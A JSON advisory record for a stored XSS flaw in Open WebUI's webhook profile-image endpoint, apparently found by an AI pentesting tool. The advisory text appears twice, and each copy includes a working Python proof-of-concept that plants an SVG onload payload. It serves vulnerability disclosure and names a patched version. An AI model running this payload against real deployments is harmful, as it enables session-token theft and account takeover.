@@ -1,0 +1,99 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-45314",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": 7.4,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-87"
+    ],
+    "description": "As part of our research on improving our [AI pentest](https://www.aikido.dev/attack/aipentest), we have uncovered the following issue in Open WebUI. We've manually verified and tided up the report, but you can also find the original agent finding at the bottom of this report.\n\n### Summary\n\nThe channel webhook create/update flow accepts arbitrary `profile_image_url` values, including `data:image/svg+xml;base64,...` payloads. The profile image endpoint then decodes and serves this SVG as `image/svg+xml` without sanitization, allowing attacker-controlled script handlers (for example onload) to execute when the profile-image URL is opened in the browser.\n\n### Details\n\nThe server accepts `data:image/svg+xml;base64,...` values for `profile_image_url` when creating or updating a webhook. Later, `GET /api/v1/channels/webhooks/{webhook_id}/profile/image` detects `data:image`, base64-decodes it, derives the media type from the header (e.g., `image/svg+xml`), and returns a `StreamingResponse` with `Content-Disposition: inline` and `media_type` set to `image/svg+xml`. There is no sanitization or transformation. When this URL is opened in a browser, SVG event handlers such as onload execute in the application origin, resulting in stored XSS.\n\n### PoC\n\n1. Set up a new instance of Open WebUI and log in as admin\n2. In the Admin Panel, enable *Channels (Beta)* and click Save\n3. Create a low-privilege user in the Users tab\n4. As the attacker, use the low-privilege user to run the following script:\n\n```py\nimport base64\nimport secrets\n\nimport requests\n\nBASE_URL = \"http://127.0.0.1:14000\"\nEMAIL = \"low@local.test\"\nPASSWORD = \"low\"\n\nCHANNEL_NAME_PREFIX = \"xsswh-poc\"\nWEBHOOK_NAME = \"xss-webhook-poc\"\nSVG_CANARY = '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(origin)\"></svg>'\n\nif __name__ == \"__main__\":\n    s = requests.Session()\n    s.headers.update({\"Content-Type\": \"application/json\"})\n\n    r = s.post(\n        f\"{BASE_URL}/api/v1/auths/signin\",\n        json={\"email\": EMAIL, \"password\": PASSWORD},\n        timeout=30,\n    )\n    r.raise_for_status()\n    s.headers[\"Authorization\"] = f\"Bearer {r.json()['token']}\"\n\n    r = s.post(\n        f\"{BASE_URL}/api/v1/channels/create\",\n        json={\n            \"name\": f\"{CHANNEL_NAME_PREFIX}-{secrets.token_hex(4)}\",\n            \"type\": \"group\",\n            \"user_ids\": [],\n            \"group_ids\": [],\n        },\n        timeout=30,\n    )\n    r.raise_for_status()\n    channel_id = r.json()[\"id\"]\n\n    payload = \"data:image/svg+xml;base64,\" + base64.b64encode(SVG_CANARY.encode()).decode()\n    r = s.post(\n        f\"{BASE_URL}/api/v1/channels/{channel_id}/webhooks/create\",\n        json={\"name\": WEBHOOK_NAME, \"profile_image_url\": payload},\n        timeout=30,\n    )\n    r.raise_for_status()\n    webhook_id = r.json()[\"id\"]\n\n    print(f\"{BASE_URL}/api/v1/channels/webhooks/{webhook_id}/profile/image\")\n```\n\nThis should print a URL like the following, which when visited (by any user), triggers a JavaScript popup proving XSS:\n\nhttp://127.0.0.1:14000/api/v1/channels/webhooks/aa7c925f-4584-4274-82bf-33a7e98a3365/profile/image\n\n<img width=\"1079\" height=\"222\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ce158ace-d14f-4a73-aeb0-e828aff005df\" />\n\n### Impact\n\nConditions required: The victim must be an authenticated, verified user. Channel feature must be enabled.\n\nStored XSS enables arbitrary JavaScript execution in the context of the application's origin for any viewer who loads the malicious profile image URL. An attacker can exfiltrate session tokens (localstorage) or API keys stored in the page context, perform unauthorized actions on behalf of the victim via same-origin APIs, alter settings, or pivot to broader account compromise. Because this vector is persisted in the database as part of a webhook's profile image, it remains active until removed.\n\n### Original Agent Report\n\n<img width=\"400\" alt=\"app aikido dev_ai-pentests_projects_116389_assessments_019d67d4-81c8-7dd2-bb9e-0a4a774b2c78_issues_sidebarIssue=20439766 (5)\" src=\"https://github.com/user-attachments/assets/0bfb2c7c-f7c4-49cd-a262-5ed9e1bb10df\" />",
+    "ghsa_id": "GHSA-3856-3vxq-m6fc",
+    "html_url": "https://github.com/advisories/GHSA-3856-3vxq-m6fc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-3856-3vxq-m6fc"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45314"
+      }
+    ],
+    "published_at": "2026-05-14T20:18:09Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-3856-3vxq-m6fc",
+      "https://github.com/open-webui/open-webui/releases/tag/v0.9.3",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-45314",
+      "https://github.com/advisories/GHSA-3856-3vxq-m6fc"
+    ],
+    "severity": "high",
+    "summary": "Open WebUI has XSS via SVG in /api/v1/channels/webhooks/{webhook_id}/profile/image",
+    "updated_at": "2026-05-19T15:58:24Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.9.3",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "<= 0.9.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-3856-3vxq-m6fc",
+  "repo": {
+    "cve_id": "CVE-2026-45314",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 7.4,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-87"
+    ],
+    "description": "As part of our research on improving our [AI pentest](https://www.aikido.dev/attack/aipentest), we have uncovered the following issue in Open WebUI. We've manually verified and tided up the report, but you can also find the original agent finding at the bottom of this report.\r\n\r\n### Summary\r\n\r\nThe channel webhook create/update flow accepts arbitrary `profile_image_url` values, including `data:image/svg+xml;base64,...` payloads. The profile image endpoint then decodes and serves this SVG as `image/svg+xml` without sanitization, allowing attacker-controlled script handlers (for example onload) to execute when the profile-image URL is opened in the browser.\r\n\r\n### Details\r\n\r\nThe server accepts `data:image/svg+xml;base64,...` values for `profile_image_url` when creating or updating a webhook. Later, `GET /api/v1/channels/webhooks/{webhook_id}/profile/image` detects `data:image`, base64-decodes it, derives the media type from the header (e.g., `image/svg+xml`), and returns a `StreamingResponse` with `Content-Disposition: inline` and `media_type` set to `image/svg+xml`. There is no sanitization or transformation. When this URL is opened in a browser, SVG event handlers such as onload execute in the application origin, resulting in stored XSS.\r\n\r\n### PoC\r\n\r\n1. Set up a new instance of Open WebUI and log in as admin\r\n2. In the Admin Panel, enable *Channels (Beta)* and click Save\r\n3. Create a low-privilege user in the Users tab\r\n4. As the attacker, use the low-privilege user to run the following script:\r\n\r\n```py\r\nimport base64\r\nimport secrets\r\n\r\nimport requests\r\n\r\nBASE_URL = \"http://127.0.0.1:14000\"\r\nEMAIL = \"low@local.test\"\r\nPASSWORD = \"low\"\r\n\r\nCHANNEL_NAME_PREFIX = \"xsswh-poc\"\r\nWEBHOOK_NAME = \"xss-webhook-poc\"\r\nSVG_CANARY = '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(origin)\"></svg>'\r\n\r\nif __name__ == \"__main__\":\r\n    s = requests.Session()\r\n    s.headers.update({\"Content-Type\": \"application/json\"})\r\n\r\n    r = s.post(\r\n        f\"{BASE_URL}/api/v1/auths/signin\",\r\n        json={\"email\": EMAIL, \"password\": PASSWORD},\r\n        timeout=30,\r\n    )\r\n    r.raise_for_status()\r\n    s.headers[\"Authorization\"] = f\"Bearer {r.json()['token']}\"\r\n\r\n    r = s.post(\r\n        f\"{BASE_URL}/api/v1/channels/create\",\r\n        json={\r\n            \"name\": f\"{CHANNEL_NAME_PREFIX}-{secrets.token_hex(4)}\",\r\n            \"type\": \"group\",\r\n            \"user_ids\": [],\r\n            \"group_ids\": [],\r\n        },\r\n        timeout=30,\r\n    )\r\n    r.raise_for_status()\r\n    channel_id = r.json()[\"id\"]\r\n\r\n    payload = \"data:image/svg+xml;base64,\" + base64.b64encode(SVG_CANARY.encode()).decode()\r\n    r = s.post(\r\n        f\"{BASE_URL}/api/v1/channels/{channel_id}/webhooks/create\",\r\n        json={\"name\": WEBHOOK_NAME, \"profile_image_url\": payload},\r\n        timeout=30,\r\n    )\r\n    r.raise_for_status()\r\n    webhook_id = r.json()[\"id\"]\r\n\r\n    print(f\"{BASE_URL}/api/v1/channels/webhooks/{webhook_id}/profile/image\")\r\n```\r\n\r\nThis should print a URL like the following, which when visited (by any user), triggers a JavaScript popup proving XSS:\r\n\r\nhttp://127.0.0.1:14000/api/v1/channels/webhooks/aa7c925f-4584-4274-82bf-33a7e98a3365/profile/image\r\n\r\n<img width=\"1079\" height=\"222\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ce158ace-d14f-4a73-aeb0-e828aff005df\" />\r\n\r\n### Impact\r\n\r\nConditions required: The victim must be an authenticated, verified user. Channel feature must be enabled.\r\n\r\nStored XSS enables arbitrary JavaScript execution in the context of the application's origin for any viewer who loads the malicious profile image URL. An attacker can exfiltrate session tokens (localstorage) or API keys stored in the page context, perform unauthorized actions on behalf of the victim via same-origin APIs, alter settings, or pivot to broader account compromise. Because this vector is persisted in the database as part of a webhook's profile image, it remains active until removed.\r\n\r\n### Original Agent Report\r\n\r\n<img width=\"400\" alt=\"app aikido dev_ai-pentests_projects_116389_assessments_019d67d4-81c8-7dd2-bb9e-0a4a774b2c78_issues_sidebarIssue=20439766 (5)\" src=\"https://github.com/user-attachments/assets/0bfb2c7c-f7c4-49cd-a262-5ed9e1bb10df\" />\r\n",
+    "ghsa_id": "GHSA-3856-3vxq-m6fc",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-3856-3vxq-m6fc",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-3856-3vxq-m6fc"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45314"
+      }
+    ],
+    "published_at": "2026-05-09T08:02:43Z",
+    "references": [],
+    "severity": "high",
+    "summary": "XSS via SVG in /api/v1/channels/webhooks/{webhook_id}/profile/image",
+    "updated_at": "2026-05-11T22:08:01Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "patched_versions": ">= 0.9.3",
+        "vulnerable_version_range": "<= 0.9.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
